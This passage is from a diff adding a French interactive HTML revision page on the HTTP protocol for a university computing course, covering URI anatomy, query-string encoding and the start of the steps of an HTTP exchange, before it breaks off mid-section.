@@ -1,0 +1,2153 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Protocole HTTP — Fiches de révision</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Mono:wght@400;500&family=Instrument+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+/* ─── Reset & base ─── */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg: #0f0f11;
+  --bg2: #17171b;
+  --bg3: #1e1e24;
+  --border: rgba(255,255,255,0.08);
+  --border2: rgba(255,255,255,0.15);
+  --text: #e8e6df;
+  --muted: #8a8780;
+  --accent: #c8f060;
+  --accent2: #5eb8ff;
+  --accent3: #ff7b5e;
+  --accent4: #c084fc;
+  --serif: 'DM Serif Display', Georgia, serif;
+  --sans: 'Instrument Sans', system-ui, sans-serif;
+  --mono: 'DM Mono', 'Fira Code', monospace;
+  --r: 10px;
+}
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  font-size: 15px;
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* ─── Scrollbar ─── */
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--bg3); border-radius: 3px; }
+
+/* ─── Layout ─── */
+.sidebar {
+  position: fixed;
+  left: 0; top: 0;
+  width: 240px;
+  height: 100vh;
+  background: var(--bg2);
+  border-right: 1px solid var(--border);
+  display: flex;
+  flex-direction: column;
+  z-index: 100;
+  overflow-y: auto;
+  transition: transform .3s;
+}
+.main {
+  margin-left: 240px;
+  min-height: 100vh;
+}
+
+/* ─── Sidebar ─── */
+.sidebar-brand {
+  padding: 28px 20px 20px;
+  border-bottom: 1px solid var(--border);
+}
+.sidebar-brand .logo-badge {
+  display: inline-block;
+  background: var(--accent);
+  color: #000;
+  font-family: var(--mono);
+  font-size: 11px;
+  font-weight: 500;
+  padding: 3px 8px;
+  border-radius: 4px;
+  margin-bottom: 10px;
+  letter-spacing: .04em;
+}
+.sidebar-brand h1 {
+  font-family: var(--serif);
+  font-size: 18px;
+  line-height: 1.3;
+  color: var(--text);
+}
+.sidebar-brand p {
+  font-size: 12px;
+  color: var(--muted);
+  margin-top: 4px;
+}
+
+.nav-section { padding: 16px 12px 8px; }
+.nav-section-label {
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: .1em;
+  color: var(--muted);
+  padding: 0 8px;
+  margin-bottom: 6px;
+}
+.nav-link {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 7px 10px;
+  border-radius: 7px;
+  text-decoration: none;
+  color: var(--muted);
+  font-size: 13.5px;
+  transition: all .15s;
+  cursor: pointer;
+  border: none;
+  background: none;
+  width: 100%;
+  text-align: left;
+}
+.nav-link:hover { background: var(--bg3); color: var(--text); }
+.nav-link.active { background: rgba(200,240,96,.1); color: var(--accent); }
+.nav-dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: currentColor;
+  opacity: .5;
+  flex-shrink: 0;
+}
+.nav-link.active .nav-dot { opacity: 1; }
+
+.sidebar-progress {
+  margin-top: auto;
+  padding: 16px;
+  border-top: 1px solid var(--border);
+}
+.progress-label {
+  font-size: 12px;
+  color: var(--muted);
+  margin-bottom: 8px;
+  display: flex;
+  justify-content: space-between;
+}
+.progress-bar {
+  height: 4px;
+  background: var(--bg3);
+  border-radius: 2px;
+  overflow: hidden;
+}
+.progress-fill {
+  height: 100%;
+  background: var(--accent);
+  border-radius: 2px;
+  transition: width .5s ease;
+}
+
+/* ─── Hero ─── */
+.hero {
+  padding: 80px 60px 60px;
+  border-bottom: 1px solid var(--border);
+  position: relative;
+  overflow: hidden;
+}
+.hero::before {
+  content: 'HTTP';
+  position: absolute;
+  right: -20px; top: -10px;
+  font-family: var(--serif);
+  font-size: 180px;
+  color: rgba(255,255,255,.03);
+  pointer-events: none;
+  line-height: 1;
+}
+.hero-tag {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--accent);
+  letter-spacing: .08em;
+  margin-bottom: 16px;
+}
+.hero h2 {
+  font-family: var(--serif);
+  font-size: 52px;
+  line-height: 1.1;
+  color: var(--text);
+  max-width: 640px;
+}
+.hero h2 em {
+  font-style: italic;
+  color: var(--accent);
+}
+.hero-sub {
+  margin-top: 16px;
+  font-size: 16px;
+  color: var(--muted);
+  max-width: 520px;
+  line-height: 1.6;
+}
+.hero-chips {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
+  margin-top: 28px;
+}
+.chip {
+  font-size: 12px;
+  font-family: var(--mono);
+  padding: 4px 12px;
+  border: 1px solid var(--border2);
+  border-radius: 20px;
+  color: var(--muted);
+}
+
+/* ─── Sections ─── */
+.section {
+  display: none;
+  padding: 0 60px 80px;
+  animation: fadeIn .25s ease;
+}
+.section.active { display: block; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: none; } }
+
+.section-header {
+  padding: 48px 0 36px;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 40px;
+}
+.section-num {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--accent);
+  letter-spacing: .08em;
+  margin-bottom: 8px;
+}
+.section-title {
+  font-family: var(--serif);
+  font-size: 40px;
+  line-height: 1.15;
+  color: var(--text);
+}
+.section-desc {
+  margin-top: 12px;
+  color: var(--muted);
+  font-size: 15px;
+  max-width: 580px;
+}
+
+/* ─── Cards ─── */
+.card {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: var(--r);
+  padding: 24px;
+  margin-bottom: 20px;
+}
+.card-title {
+  font-family: var(--mono);
+  font-size: 11px;
+  letter-spacing: .1em;
+  text-transform: uppercase;
+  color: var(--accent);
+  margin-bottom: 14px;
+}
+.grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+.grid3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 14px; }
+
+/* ─── Code blocks ─── */
+pre, code { font-family: var(--mono); }
+pre {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 18px 20px;
+  font-size: 13px;
+  line-height: 1.8;
+  overflow-x: auto;
+  margin: 16px 0;
+  position: relative;
+}
+code {
+  background: rgba(255,255,255,.07);
+  padding: 1px 6px;
+  border-radius: 4px;
+  font-size: 13px;
+  color: var(--accent);
+}
+pre code { background: none; padding: 0; color: inherit; }
+.kw { color: #5eb8ff; }
+.val { color: #c8f060; }
+.cmt { color: #555; font-style: italic; }
+.hdr { color: #c084fc; }
+.ok { color: #6ee7b7; }
+.err { color: #ff7b5e; }
+
+/* ─── URI anatomy ─── */
+.uri-display {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 20px 24px;
+  font-family: var(--mono);
+  font-size: 14px;
+  letter-spacing: .02em;
+  line-height: 2;
+  margin-bottom: 20px;
+  word-break: break-all;
+}
+.uri-scheme { color: #5eb8ff; font-weight: 500; }
+.uri-auth   { color: #6ee7b7; font-weight: 500; }
+.uri-path   { color: #fde68a; font-weight: 500; }
+.uri-query  { color: #c8f060; font-weight: 500; }
+.uri-frag   { color: #c084fc; font-weight: 500; }
+.uri-sep    { color: var(--muted); }
+
+.legend {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 12px;
+  margin-top: 12px;
+}
+.legend-item {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 12px;
+  font-family: var(--mono);
+}
+.legend-dot {
+  width: 10px; height: 10px;
+  border-radius: 50%;
+}
+
+/* ─── HTTP message anatomy ─── */
+.msg-block {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  overflow: hidden;
+  margin-bottom: 20px;
+}
+.msg-part {
+  padding: 12px 20px;
+  border-bottom: 1px solid var(--border);
+  font-family: var(--mono);
+  font-size: 13px;
+  line-height: 1.7;
+  position: relative;
+}
+.msg-part:last-child { border-bottom: none; }
+.msg-label {
+  position: absolute;
+  right: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: .08em;
+  opacity: .5;
+}
+.msg-part.line1   { background: rgba(94,184,255,.07); }
+.msg-part.headers { background: rgba(192,132,252,.05); }
+.msg-part.blank   { background: rgba(255,123,94,.08); padding: 8px 20px; }
+.msg-part.body    { background: rgba(200,240,96,.04); }
+
+/* ─── Status codes ─── */
+.status-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 10px;
+  margin-bottom: 20px;
+}
+.status-card {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 14px 16px;
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+}
+.status-num {
+  font-family: var(--mono);
+  font-size: 22px;
+  font-weight: 500;
+  line-height: 1;
+  flex-shrink: 0;
+}
+.s1 .status-num { color: var(--accent2); }
+.s2 .status-num { color: #6ee7b7; }
+.s3 .status-num { color: var(--accent); }
+.s4 .status-num { color: var(--accent3); }
+.s5 .status-num { color: #f87171; }
+.status-info p { font-size: 13px; color: var(--muted); margin-top: 2px; }
+.status-info strong { font-size: 14px; color: var(--text); font-weight: 500; }
+
+/* ─── Comparison table ─── */
+.compare-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 13.5px;
+}
+.compare-table th {
+  text-align: left;
+  padding: 10px 16px;
+  background: var(--bg3);
+  font-family: var(--mono);
+  font-size: 11px;
+  letter-spacing: .08em;
+  text-transform: uppercase;
+  color: var(--accent);
+  border-bottom: 1px solid var(--border);
+}
+.compare-table td {
+  padding: 10px 16px;
+  border-bottom: 1px solid var(--border);
+  color: var(--muted);
+  vertical-align: top;
+}
+.compare-table tr:last-child td { border-bottom: none; }
+.compare-table td:first-child { color: var(--text); font-weight: 500; }
+.compare-table .yes { color: #6ee7b7; }
+.compare-table .no  { color: var(--accent3); }
+
+/* ─── Cookie/session flow ─── */
+.flow-timeline {
+  display: flex;
+  flex-direction: column;
+  gap: 0;
+  position: relative;
+}
+.flow-timeline::before {
+  content: '';
+  position: absolute;
+  left: 19px; top: 22px; bottom: 22px;
+  width: 1px;
+  background: var(--border);
+}
+.flow-step {
+  display: flex;
+  gap: 14px;
+  align-items: flex-start;
+  padding: 10px 0;
+}
+.flow-num {
+  width: 38px; height: 38px;
+  border-radius: 50%;
+  background: var(--bg3);
+  border: 1px solid var(--border2);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--accent);
+  flex-shrink: 0;
+  position: relative;
+  z-index: 1;
+}
+.flow-content { padding-top: 8px; }
+.flow-content strong { color: var(--text); display: block; font-size: 14px; margin-bottom: 3px; }
+.flow-content span { color: var(--muted); font-size: 13px; }
+.flow-content code { font-size: 12px; }
+
+/* ─── Interactive exercises ─── */
+.exercise {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: var(--r);
+  overflow: hidden;
+  margin-bottom: 24px;
+}
+.exercise-header {
+  background: rgba(200,240,96,.06);
+  border-bottom: 1px solid var(--border);
+  padding: 14px 20px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.exercise-tag {
+  font-family: var(--mono);
+  font-size: 10px;
+  letter-spacing: .1em;
+  text-transform: uppercase;
+  background: var(--accent);
+  color: #000;
+  padding: 2px 8px;
+  border-radius: 3px;
+}
+.exercise-title {
+  font-size: 14px;
+  font-weight: 500;
+  color: var(--text);
+}
+.exercise-body { padding: 20px; }
+
+/* Quiz */
+.quiz-q {
+  font-size: 15px;
+  color: var(--text);
+  margin-bottom: 14px;
+  line-height: 1.5;
+}
+.quiz-options { display: flex; flex-direction: column; gap: 8px; }
+.quiz-opt {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 11px 16px;
+  cursor: pointer;
+  font-size: 14px;
+  color: var(--muted);
+  transition: all .15s;
+  text-align: left;
+  width: 100%;
+  font-family: var(--sans);
+}
+.quiz-opt:hover { border-color: var(--border2); color: var(--text); }
+.quiz-opt.correct { border-color: #6ee7b7; background: rgba(110,231,183,.08); color: #6ee7b7; }
+.quiz-opt.wrong   { border-color: var(--accent3); background: rgba(255,123,94,.08); color: var(--accent3); }
+.quiz-feedback {
+  margin-top: 12px;
+  padding: 12px 14px;
+  border-radius: 7px;
+  font-size: 13.5px;
+  line-height: 1.5;
+  display: none;
+}
+.quiz-feedback.show { display: block; }
+.quiz-feedback.good { background: rgba(110,231,183,.08); color: #6ee7b7; border: 1px solid rgba(110,231,183,.2); }
+.quiz-feedback.bad  { background: rgba(255,123,94,.08);  color: var(--accent3); border: 1px solid rgba(255,123,94,.2); }
+.quiz-next {
+  margin-top: 12px;
+  background: var(--accent);
+  color: #000;
+  border: none;
+  border-radius: 7px;
+  padding: 9px 20px;
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  display: none;
+  font-family: var(--sans);
+  transition: opacity .15s;
+}
+.quiz-next:hover { opacity: .85; }
+.quiz-next.show { display: inline-block; }
+
+/* URI builder */
+.uri-builder input, .uri-builder select {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  padding: 8px 12px;
+  font-family: var(--mono);
+  font-size: 13px;
+  width: 100%;
+  outline: none;
+  transition: border-color .15s;
+}
+.uri-builder input:focus, .uri-builder select:focus { border-color: var(--accent); }
+.uri-builder label { font-size: 12px; color: var(--muted); margin-bottom: 4px; display: block; }
+.uri-builder .field { margin-bottom: 12px; }
+.uri-result {
+  font-family: var(--mono);
+  font-size: 13px;
+  background: var(--bg);
+  border: 1px solid var(--border2);
+  border-radius: 8px;
+  padding: 14px 16px;
+  margin-top: 16px;
+  word-break: break-all;
+  line-height: 1.8;
+  min-height: 50px;
+}
+
+/* HTTP builder */
+.builder-area {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 16px;
+}
+.builder-col { }
+.builder-label {
+  font-size: 11px;
+  font-family: var(--mono);
+  letter-spacing: .08em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 8px;
+}
+.builder-choices { display: flex; flex-direction: column; gap: 6px; }
+.builder-choice {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 7px;
+  padding: 9px 12px;
+  cursor: pointer;
+  font-size: 13px;
+  font-family: var(--mono);
+  color: var(--muted);
+  transition: all .15s;
+  user-select: none;
+}
+.builder-choice:hover { border-color: var(--border2); color: var(--text); }
+.builder-choice.selected { border-color: var(--accent); color: var(--accent); background: rgba(200,240,96,.06); }
+.builder-output {
+  font-family: var(--mono);
+  font-size: 12.5px;
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 16px;
+  line-height: 1.9;
+  min-height: 160px;
+  white-space: pre-wrap;
+}
+.builder-check {
+  margin-top: 12px;
+  background: var(--accent2);
+  color: #000;
+  border: none;
+  border-radius: 7px;
+  padding: 9px 20px;
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  font-family: var(--sans);
+  transition: opacity .15s;
+}
+.builder-check:hover { opacity: .85; }
+
+/* Drag & drop matching */
+.match-game {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 20px;
+}
+.match-col-label {
+  font-size: 11px;
+  font-family: var(--mono);
+  letter-spacing: .1em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 10px;
+}
+.match-item {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 7px;
+  padding: 9px 14px;
+  font-family: var(--mono);
+  font-size: 13px;
+  color: var(--text);
+  margin-bottom: 6px;
+  cursor: pointer;
+  transition: all .15s;
+  user-select: none;
+}
+.match-item:hover { border-color: var(--border2); }
+.match-item.selected { border-color: var(--accent2); background: rgba(94,184,255,.07); }
+.match-item.matched  { border-color: #6ee7b7; background: rgba(110,231,183,.07); color: #6ee7b7; cursor: default; }
+.match-item.wrong    { border-color: var(--accent3); background: rgba(255,123,94,.07); animation: shake .3s; }
+@keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-6px)} 75%{transform:translateX(6px)} }
+
+/* Score */
+.score-display {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-top: 14px;
+  font-family: var(--mono);
+  font-size: 13px;
+  color: var(--muted);
+}
+.score-num { font-size: 24px; color: var(--accent); }
+
+/* Reset btn */
+.btn-reset {
+  background: var(--bg3);
+  border: 1px solid var(--border2);
+  color: var(--muted);
+  border-radius: 7px;
+  padding: 8px 16px;
+  font-size: 12px;
+  cursor: pointer;
+  font-family: var(--sans);
+  transition: all .15s;
+}
+.btn-reset:hover { color: var(--text); border-color: var(--text); }
+
+/* ─── XSS Demo ─── */
+.xss-demo {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 16px;
+  margin-top: 16px;
+}
+.fake-browser {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  overflow: hidden;
+}
+.fake-browser-bar {
+  background: var(--bg3);
+  padding: 8px 12px;
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--muted);
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.fake-dots { display: flex; gap: 4px; }
+.fake-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--border2); }
+.fake-browser-content {
+  padding: 14px;
+  font-size: 13px;
+  min-height: 80px;
+}
+.xss-url-input {
+  width: 100%;
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 3px 8px;
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--muted);
+  flex: 1;
+  outline: none;
+}
+
+/* ─── Tips ─── */
+.tip {
+  display: flex;
+  gap: 12px;
+  background: rgba(200,240,96,.04);
+  border: 1px solid rgba(200,240,96,.15);
+  border-radius: 8px;
+  padding: 14px 16px;
+  margin: 16px 0;
+}
+.tip-icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+.tip-text { font-size: 13.5px; color: var(--muted); line-height: 1.6; }
+.tip-text strong { color: var(--accent); }
+
+.warn {
+  background: rgba(255,123,94,.05);
+  border: 1px solid rgba(255,123,94,.2);
+}
+.warn .tip-text strong { color: var(--accent3); }
+
+/* ─── Mobile ─── */
+.hamburger {
+  display: none;
+  position: fixed;
+  top: 14px; left: 14px;
+  z-index: 200;
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  width: 38px; height: 38px;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  flex-direction: column;
+  gap: 4px;
+}
+.hamburger span {
+  display: block;
+  width: 18px; height: 1.5px;
+  background: var(--text);
+  border-radius: 1px;
+}
+.overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,.6);
+  z-index: 90;
+}
+
+@media (max-width: 900px) {
+  .sidebar { transform: translateX(-100%); }
+  .sidebar.open { transform: translateX(0); }
+  .main { margin-left: 0; }
+  .hamburger { display: flex; }
+  .hero { padding: 60px 24px 40px; }
+  .hero::before { display: none; }
+  .hero h2 { font-size: 36px; }
+  .section { padding: 0 24px 60px; }
+  .grid2, .grid3, .builder-area, .match-game, .xss-demo { grid-template-columns: 1fr; }
+}
+
+/* ─── Utilities ─── */
+p { color: var(--muted); line-height: 1.7; margin-bottom: 12px; }
+h3 { font-family: var(--serif); font-size: 22px; color: var(--text); margin: 28px 0 12px; }
+h4 { font-size: 14px; font-weight: 600; color: var(--text); margin: 20px 0 8px; letter-spacing: .02em; }
+strong { color: var(--text); }
+ul { padding-left: 18px; }
+li { color: var(--muted); margin-bottom: 4px; font-size: 14px; }
+li strong { color: var(--text); }
+</style>
+</head>
+<body>
+
+<button class="hamburger" id="hamburger" aria-label="Menu">
+  <span></span><span></span><span></span>
+</button>
+<div class="overlay" id="overlay"></div>
+
+<!-- ─── Sidebar ─── -->
+<aside class="sidebar" id="sidebar">
+  <div class="sidebar-brand">
+    <div class="logo-badge">BUT INFO · S2</div>
+    <h1>Protocole HTTP</h1>
+    <p>Fiches de révision interactives</p>
+  </div>
+
+  <nav class="nav-section">
+    <div class="nav-section-label">Cours</div>
+    <button class="nav-link active" onclick="showSection('home')">
+      <span class="nav-dot"></span> Accueil
+    </button>
+    <button class="nav-link" onclick="showSection('uri')">
+      <span class="nav-dot"></span> URI &amp; adresses web
+    </button>
+    <button class="nav-link" onclick="showSection('echanges')">
+      <span class="nav-dot"></span> Échanges HTTP
+    </button>
+    <button class="nav-link" onclick="showSection('messages')">
+      <span class="nav-dot"></span> Messages HTTP
+    </button>
+    <button class="nav-link" onclick="showSection('reponse')">
+      <span class="nav-dot"></span> Codes de réponse
+    </button>
+    <button class="nav-link" onclick="showSection('cache')">
+      <span class="nav-dot"></span> Cache &amp; conditionnel
+    </button>
+    <button class="nav-link" onclick="showSection('cookies')">
+      <span class="nav-dot"></span> Cookies &amp; sessions
+    </button>
+    <button class="nav-link" onclick="showSection('xss')">
+      <span class="nav-dot"></span> Sécurité &amp; XSS
+    </button>
+  </nav>
+
+  <nav class="nav-section">
+    <div class="nav-section-label">Exercices</div>
+    <button class="nav-link" onclick="showSection('ex-quiz')">
+      <span class="nav-dot"></span> Quiz général
+    </button>
+    <button class="nav-link" onclick="showSection('ex-uri')">
+      <span class="nav-dot"></span> Constructeur d'URI
+    </button>
+    <button class="nav-link" onclick="showSection('ex-req')">
+      <span class="nav-dot"></span> Construis ta requête
+    </button>
+    <button class="nav-link" onclick="showSection('ex-match')">
+      <span class="nav-dot"></span> Associer les en-têtes
+    </button>
+  </nav>
+
+  <div class="sidebar-progress">
+    <div class="progress-label">
+      <span>Score quiz</span>
+      <span id="score-label">0 / 0</span>
+    </div>
+    <div class="progress-bar">
+      <div class="progress-fill" id="progress-fill" style="width:0%"></div>
+    </div>
+  </div>
+</aside>
+
+<!-- ─── Main ─── -->
+<main class="main">
+
+  <!-- HOME -->
+  <div id="s-home" class="section active">
+    <div class="hero">
+      <div class="hero-tag">// PROTOCOLE HTTP — RÉVISIONS</div>
+      <h2>Le Web, de l'URL à la <em>réponse</em></h2>
+      <p class="hero-sub">Toutes les notions du cours, expliquées visuellement avec des exercices interactifs pour tester tes connaissances avant l'examen.</p>
+      <div class="hero-chips">
+        <span class="chip">URI / URL</span>
+        <span class="chip">HTTP 1.0 / 1.1</span>
+        <span class="chip">GET / POST</span>
+        <span class="chip">En-têtes</span>
+        <span class="chip">Codes d'état</span>
+        <span class="chip">Cache</span>
+        <span class="chip">Cookies</span>
+        <span class="chip">Sessions</span>
+        <span class="chip">XSS</span>
+      </div>
+    </div>
+    <div style="padding: 40px 60px;">
+      <div class="grid3">
+        <div class="card" style="cursor:pointer;transition:border-color .2s;" onmouseenter="this.style.borderColor='var(--accent)'" onmouseleave="this.style.borderColor=''" onclick="showSection('uri')">
+          <div class="card-title">01 — URI</div>
+          <p style="font-size:14px;">Décompose n'importe quelle adresse web : scheme, authority, path, query, fragment.</p>
+        </div>
+        <div class="card" style="cursor:pointer;transition:border-color .2s;" onmouseenter="this.style.borderColor='var(--accent2)'" onmouseleave="this.style.borderColor=''" onclick="showSection('echanges')">
+          <div class="card-title">02 — Échanges</div>
+          <p style="font-size:14px;">DNS, TCP, requête, réponse : l'ordre exact de ce qui se passe quand tu tapes une URL.</p>
+        </div>
+        <div class="card" style="cursor:pointer;transition:border-color .2s;" onmouseenter="this.style.borderColor='var(--accent4)'" onmouseleave="this.style.borderColor=''" onclick="showSection('messages')">
+          <div class="card-title">03 — Messages</div>
+          <p style="font-size:14px;">Structure ligne par ligne d'une requête et d'une réponse HTTP. GET vs POST.</p>
+        </div>
+        <div class="card" style="cursor:pointer;transition:border-color .2s;" onmouseenter="this.style.borderColor='var(--accent3)'" onmouseleave="this.style.borderColor=''" onclick="showSection('reponse')">
+          <div class="card-title">04 — Codes d'état</div>
+          <p style="font-size:14px;">1xx à 5xx, leurs significations et quand le serveur les utilise.</p>
+        </div>
+        <div class="card" style="cursor:pointer;transition:border-color .2s;" onmouseenter="this.style.borderColor='var(--accent)'" onmouseleave="this.style.borderColor=''" onclick="showSection('cache')">
+          <div class="card-title">05 — Cache</div>
+          <p style="font-size:14px;">If-Modified-Since, 304 Not Modified et l'économie de bande passante.</p>
+        </div>
+        <div class="card" style="cursor:pointer;transition:border-color .2s;" onmouseenter="this.style.borderColor='var(--accent4)'" onmouseleave="this.style.borderColor=''" onclick="showSection('cookies')">
+          <div class="card-title">06 — Cookies &amp; Sessions</div>
+          <p style="font-size:14px;">Comment HTTP se "souvient" de toi malgré son absence d'état.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ─── URI ─── -->
+  <div id="s-uri" class="section">
+    <div class="section-header">
+      <div class="section-num">01 / URI &amp; adresses web</div>
+      <h2 class="section-title">Universal Resource Identifier</h2>
+      <p class="section-desc">Une URI identifie une ressource sur le web. Elle est décomposée en plusieurs parties avec chacune un rôle précis.</p>
+    </div>
+
+    <h3>Anatomie d'une URI</h3>
+    <div class="uri-display">
+      <span class="uri-scheme">https</span><span class="uri-sep">://</span><span class="uri-auth">user:pass@iut.univ-reims.fr:443</span><span class="uri-path">/cours/http/index.php</span><span class="uri-sep">?</span><span class="uri-query">page=2&amp;theme=dark</span><span class="uri-sep">#</span><span class="uri-frag">intro</span>
+    </div>
+    <div class="legend">
+      <div class="legend-item"><div class="legend-dot" style="background:#5eb8ff"></div><span style="color:#5eb8ff">scheme</span> — protocole</div>
+      <div class="legend-item"><div class="legend-dot" style="background:#6ee7b7"></div><span style="color:#6ee7b7">authority</span> — [userinfo@]host[:port]</div>
+      <div class="legend-item"><div class="legend-dot" style="background:#fde68a"></div><span style="color:#fde68a">path</span> — chemin ressource</div>
+      <div class="legend-item"><div class="legend-dot" style="background:#c8f060"></div><span style="color:#c8f060">query</span> — paramètres</div>
+      <div class="legend-item"><div class="legend-dot" style="background:#c084fc"></div><span style="color:#c084fc">fragment</span> — ancre dans la page</div>
+    </div>
+
+    <div class="tip" style="margin-top:24px;">
+      <div class="tip-icon">💡</div>
+      <div class="tip-text">Le <strong>fragment</strong> (<code>#intro</code>) n'est jamais envoyé au serveur. Il est traité uniquement par le navigateur pour faire défiler la page jusqu'à l'élément avec <code>id="intro"</code>.</div>
+    </div>
+
+    <div class="grid2" style="margin-top:24px;">
+      <div class="card">
+        <div class="card-title">Schémas courants</div>
+        <table class="compare-table">
+          <tr><td><code>http://</code></td><td>Web non chiffré (port 80)</td></tr>
+          <tr><td><code>https://</code></td><td>Web chiffré TLS (port 443)</td></tr>
+          <tr><td><code>ftp://</code></td><td>Transfert de fichiers</td></tr>
+          <tr><td><code>mailto:</code></td><td>Envoi d'email</td></tr>
+          <tr><td><code>file://</code></td><td>Fichier local</td></tr>
+        </table>
+      </div>
+      <div class="card">
+        <div class="card-title">Query string</div>
+        <p>Commence par <code>?</code>, paires <code>nom=valeur</code> séparées par <code>&amp;</code> :</p>
+        <pre>?firstname=John&amp;lastname=Doe
+?darkmode&amp;theme=green
+?q=meuh%2C+meuh+%26+meuh</pre>
+        <div class="tip warn" style="margin:8px 0 0;">
+          <div class="tip-icon">⚠</div>
+          <div class="tip-text">Les valeurs doivent être <strong>encodées</strong> — les espaces deviennent <code>+</code> ou <code>%20</code>, <code>&amp;</code> devient <code>%26</code>.</div>
+        </div>
+      </div>
+    </div>
+
+    <h3>Exemples d'URIs décomposées</h3>
+    <div class="card">
+      <div class="card-title">Exemples du cours</div>
+      <table class="compare-table">
+        <tr>
+          <th>URI</th><th>scheme</th><th>host</th><th>path</th><th>query</th>
+        </tr>
+        <tr>
+          <td><code style="font-size:11px">https://example.com/</code></td>
+          <td>https</td><td>example.com</td><td>/</td><td>—</td>
+        </tr>
+        <tr>
+          <td><code style="font-size:11px">http://demo.ad-urca.univ-reims.fr/?info</code></td>
+          <td>http</td><td>demo.ad-urca…</td><td>/</td><td>info</td>
+        </tr>
+        <tr>
+          <td><code style="font-size:11px">mysql://app:pass@127.0.0.1:3306/app</code></td>
+          <td>mysql</td><td>127.0.0.1</td><td>/app</td><td>—</td>
+        </tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- ─── ÉCHANGES ─── -->
+  <div id="s-echanges" class="section">
+    <div class="section-header">
+      <div class="section-num">02 / Échanges HTTP</div>
+      <h2 class="section-title">Ce qui se passe quand tu tapes une URL</h2>
+      <p class="section-desc">Un échange HTTP suit toujours le même ordre en 6 étapes. Pas une de plus, pas une de moins.</p>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Déroulement d'un échange</div>
+      <div class="flow-timeline">
+        <div class="flow-step">
+          <div class="flow-num">1</div>
+          <div class="flow-content">
+            <strong>Résolution DNS</strong>
+            <span>Le navigateur convertit le nom de domaine en adresse IP. <code>iut.univ-reims.fr</code> → <code>193.50.230.10</code></span>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">2</div>
+          <div class="flow-content">
+            <strong>Connexion TCP</strong>
+            <span>Ouverture d'une connexion réseau sur le port <code>80</code> (HTTP) ou <code>443</code> (HTTPS). Le serveur accepte.</span>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">3</div>
+          <div class="flow-content">
+            <strong>Envoi de la requête HTTP</strong>
+            <span>Le client envoie son message : méthode, path, en-têtes, éventuellement un corps.</span>
+          </div>
+        </div>
+        <div class="flow-step">
+          <div class="flow-num">4</div>
+          <div class="flow-content">
